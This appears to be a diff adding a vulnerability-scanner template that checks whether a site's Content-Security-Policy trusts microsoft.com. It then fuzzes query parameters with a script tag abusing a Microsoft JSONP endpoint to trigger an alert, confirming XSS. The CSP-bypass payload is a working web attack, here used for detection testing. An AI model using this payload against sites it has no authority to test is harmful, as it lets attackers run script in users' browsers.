@@ -1,0 +1,55 @@
+id: microsoft-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Microsoft API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,microsoft-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "microsoft.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: microsoft_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "microsoft_api_csp_xss == true"
+# digest: 4a0a00473045022025b934e300b32f409fd74466d79b4c153f6a0a04fb7e05221b680e0463323b43022100f55cb1e562c79164d650d01868fa6c7afb9562271f0edce2fbfe7b74f4900134:922c64590222798bb761d5b6d8e72950
